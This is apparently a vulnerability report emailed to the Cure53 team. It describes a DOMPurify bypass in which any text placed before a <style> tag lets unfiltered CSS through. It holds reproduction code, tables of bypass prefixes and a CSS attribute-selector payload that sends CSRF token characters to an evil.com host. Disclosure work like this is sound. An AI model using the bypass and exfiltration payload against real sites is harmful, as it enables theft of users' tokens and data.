**Subject:** DOMPurify CSS Content Filtering Bypass — Body-Context `<style>` Skips Sanitization

Hi Cure53 team,

I found a CSS content filtering bypass in DOMPurify 3.3.1 (also confirmed on 3.2.4 CDN build) while running a grammar-based differential HTML fuzzer against DOMPurify, sanitize-html, and js-xss.

## Summary

DOMPurify's CSS content filtering (which blocks `javascript:` URIs, `-moz-binding`, etc. inside `<style>` elements) is completely skipped when any non-whitespace text or body-context HTML element precedes the `<style>` tag. This allows arbitrary CSS injection, which can be used for data exfiltration via CSS attribute selectors.

## Reproduction

```js
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const purify = DOMPurify(new JSDOM('').window);

// Blocked — <style> is the first element
purify.sanitize('<style>@import url("javascript:x");</style>');
// → ""

// Bypass — single character before <style>
purify.sanitize('x<style>@import url("javascript:x");</style>');
// → 'x<style>@import url("javascript:x");</style>'
```

Any non-whitespace prefix triggers the bypass:

| Prefix | Result |
|--------|--------|
| (none) | Blocked |
| Space, `\n`, `\t` | Blocked |
| `<!-- comment -->` | Blocked |
| `<title>X</title>` | Blocked |
| `x` (single char) | **Bypass** |
| `\u200B` (zero-width space) | **Bypass** |
| `\xA0` (NBSP) | **Bypass** |
| `<div></div>` | **Bypass** |
| `<br>` | **Bypass** |
| `<p>text</p>` | **Bypass** |

Affected CSS patterns (with text prefix):

| Pattern | Without prefix | With prefix |
|---------|---------------|-------------|
| `@import url("javascript:...")` | Blocked | **Bypass** |
| `background: url("javascript:...")` | Blocked | **Bypass** |
| `-moz-binding: url("javascript:...")` | Blocked | **Bypass** |
| `expression(alert(1))` | Blocked | Blocked |
| `@import url("data:...")` | Blocked | Blocked |

## Root Cause

DOMPurify appears to apply CSS content inspection only when `<style>` is parsed in head context. When a text node or body-context element precedes the `<style>` tag, the HTML5 parser places it in body context, and DOMPurify skips CSS URI/expression filtering entirely.

## Impact

While `javascript:` URIs in CSS are not executed by modern browsers, the real impact is that arbitrary CSS injection becomes possible. In practice this enables:

**CSRF token / sensitive data exfiltration via CSS attribute selectors:**

```
Attacker submits:
  Nice post!<style>
  input[name="csrf"][value^="a"] ~ * { background: url(https://evil.com/leak?a); }
  input[name="csrf"][value^="b"] ~ * { background: url(https://evil.com/leak?b); }
  ...
  </style>

DOMPurify passes the entire <style> block through because "Nice post!" precedes it.
Browser applies CSS → matching selector triggers background-image fetch to attacker server.
Attacker chains @import to leak the full token character by character.
```

This attack:
- Requires **no JavaScript** (bypasses `script-src 'self'` CSP)
- Requires **no user interaction** (fires on page load)
- Works on **all modern browsers** (CSS attribute selectors + background-image are universal)
- Is practical because sanitized user content is nearly always preceded by other page content, so the bypass condition is virtually always met

## Environment

- DOMPurify 3.3.1 (npm, via JSDOM) — bypass confirmed
- DOMPurify 3.2.4 (CDN, in-browser) — bypass confirmed
- Node.js v24.13.0, jsdom 26.x
- Also tested in Chrome 133, Firefox 135

## Discovery

Found by automated grammar-based fuzzer. The fuzzer generated an input with a BOM prefix + DOCTYPE + multiple `<style>` blocks, one of which contained `@import url("javascript:void(0)")`. The XSS oracle flagged it. Manual analysis narrowed the bypass condition to the text-prefix pattern described above.

Best regards

---

*Attachments:*
- `poc_css_data_exfil.html` — Interactive PoC demonstrating CSRF token exfiltration
- `test_css_import5.js` — Node.js script testing all bypass conditions
